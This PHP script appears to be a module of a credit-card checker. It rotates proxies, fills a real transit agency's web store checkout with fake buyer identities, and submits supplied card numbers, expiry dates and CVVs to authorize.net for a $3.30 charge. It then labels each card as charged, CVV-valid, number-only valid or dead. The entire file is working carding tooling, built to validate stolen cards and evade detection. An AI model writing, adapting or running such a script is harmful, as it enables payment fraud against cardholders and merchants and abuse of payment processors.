<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.norta.com/store', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$RVT_V1 = trim(strip_tags($this->getstr($r1->body, '__RequestVerificationToken" type="hidden" value="', '"')));

if (empty($RVT_V1)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$data = 'SKUID=14&Units=1&ProductName=Senior+1-Day+Jazzy+Pass&__RequestVerificationToken='.$RVT_V1;

$r2 = $this->curlx->Post('https://www.norta.com/checkout/additem', $data, null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$r3 = $this->curlx->Get('https://www.norta.com/Store/checkout/shoppingcart', null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$RVT_V2 = trim(strip_tags($this->getstr($r3->body, '__RequestVerificationToken" type="hidden" value="', '"')));

if (empty($RVT_V2)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$data = '__RequestVerificationToken='.$RVT_V2;

$r4 = $this->curlx->Post('https://www.norta.com/checkout/shoppingcartcheckout', $data, null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$r5 = $this->curlx->Get('https://www.norta.com/Store/checkout/billing-and-shipping-address', null, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$RVT_V3 = trim(strip_tags($this->getstr($r5->body, '__RequestVerificationToken" type="hidden" value="', '"')));

if (empty($RVT_V3)) {
	$empty = 'Fifth Request Token is Empty';

	goto start;
}

$data = 'flexRadioDefault=Personal&Customer.Company=&Customer.FirstName='.$fake->first.'&Customer.LastName='.$fake->last.'&Customer.Email='.urlencode($fake->email).'&BillingAddress.BillingAddressLine1=12+main+street&BillingAddress.BillingAddressLine2=&BillingAddress.BillingAddressCity=Brewster&BillingAddress.BillingAddressPostalCode=10509&BillingAddress.BillingAddressCountryStateSelector.CountryID=271&BillingAddress.BillingAddressCountryStateSelector.StateID=103&BillingAddress.BillingAddressCountryStateSelector.StateorRegion=&BillingAddress.BillingAddressPhone=2564567654&ShippingAddress.ShippingAddressLine1=&ShippingAddress.ShippingAddressLine2=&ShippingAddress.ShippingAddressCity=&ShippingAddress.ShippingAddressCountryStateSelector.CountryID=271&ShippingAddress.ShippingAddressCountryStateSelector.StateID=Select+state&ShippingAddress.ShippingAddressCountryStateSelector.StateorRegion=&ShippingAddress.ShippingAddressPostalCode=&ShippingAddress.ShippingAddressPhone=&__RequestVerificationToken='.$RVT_V3.'&BillingAddress.ShippingAddressDifferent=false';

$r6 = $this->curlx->Post('https://www.norta.com/store/checkout/billing-and-shipping-address', $data, null, $cookie, $server['proxy']);

if (!$r6->success) goto start;

$RVT_V4 = trim(strip_tags($this->getstr($r6->body, '__RequestVerificationToken" type="hidden" value="', '"')));

if (empty($RVT_V4)) {
	$empty = 'Sixth Request Token is Empty';

	goto start;
}

$data = 'ShippingOption.ShippingOptionID=9&txtDeliveryDate=&ShippingOption.DeliveryDate=&zipCode=&PaymentMethod.PaymentMethodID=1&__RequestVerificationToken='.$RVT_V4;

$r7 = $this->curlx->Post('https://www.norta.com/store/checkout/shipping-and-payment', $data, null, $cookie, $server['proxy']);

if (!$r7->success) goto start;

$r8 = $this->curlx->Get('https://www.norta.com/checkout/makepayment', null, $cookie, $server['proxy']);

if (!$r8->success) goto start;

$token = trim($this->getstr($r8->body, 'token" value="', '"'));

$dec = html_entity_decode($token);

if (empty($dec)) {
	$empty = 'Eight Request Token is Empty';

	goto start;
}

$c1 = substr($cc, 0, 4);
$c2 = substr($cc, 4, 4);
$c3 = substr($cc, 8, 4);
$c4 = substr($cc, -4);

$data = 'token='.urlencode($dec).'&totalAmount=3.30&paymentMethod=cc&creditCard='.$c1.'+'.$c2.'+'.$c3.'+'.$c4.'&expirationDate='.$mm.'%2F'.$yy.'&cardCode='.$cvv.'&billingInfo%5BfirstName%5D='.$fake->first.'&billingInfo%5BlastName%5D='.$fake->last.'&billingInfo%5Bcompany%5D=&billingInfo%5Baddress%5D=12+main+street&billingInfo%5Bcity%5D=Brewster&billingInfo%5Bstate%5D=New+York&billingInfo%5Bzip%5D=10509&billingInfo%5Bcountry%5D=US&billingInfo%5BphoneNumber%5D=&billingInfo%5BfaxNumber%5D=&shippingInfo%5BfirstName%5D='.$fake->first.'&shippingInfo%5BlastName%5D='.$fake->last.'&shippingInfo%5Bcompany%5D=&shippingInfo%5Baddress%5D=12+main+street&shippingInfo%5Bcity%5D=Brewster&shippingInfo%5Bstate%5D=New+York&shippingInfo%5Bzip%5D=10509&shippingInfo%5Bcountry%5D=US&email='.urlencode($fake->email);

$headers = [
	'Accept: application/json',
	'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'Connection: keep-alive',
	'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
	'Origin: https://accept.authorize.net',
	'Referer: https://accept.authorize.net/payment/payment',
	'Sec-Fetch-Dest: empty',
	'Sec-Fetch-Mode: cors',
	'Sec-Fetch-Site: same-origin',
	'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"'
];

$r9 = $this->curlx->Post('https://accept.authorize.net/Payment/Api.ashx', $data, $headers, $cookie, $server['proxy']);

if (!$r9->success) goto start;

$json_r9 = json_decode($r9->body);

if ($json_r9->resultCode == 'Ok') {
	$transId = $json_r9->transactionData->transId;

	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CHARGED - Result Code -> OK! ({$transId})"];

	goto end;
}

$msg = $json_r9->messageText ?? '';

if (empty($msg)) file_put_contents('aux_r9_msg.txt', $r9->body . PHP_EOL, FILE_APPEND);


$code = intval($json_r9->messageCode ?? '');

$err = "$msg! ($code)";

$status = ['status' => 'APPROVED', 'emoji' => '✅'];

if (strpos($msg, 'AVS') !== false || $code == 45) {
	$status['msg'] = "CVV CARD - AVS Failed -> $err";
} elseif ($code == 44 || $code == 145) {
	$status['msg'] = "CCN CARD - $err";
} else {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => 'DEAD - '.(empty($msg) ? 'Unknown Error!' : $err).''];
}

end: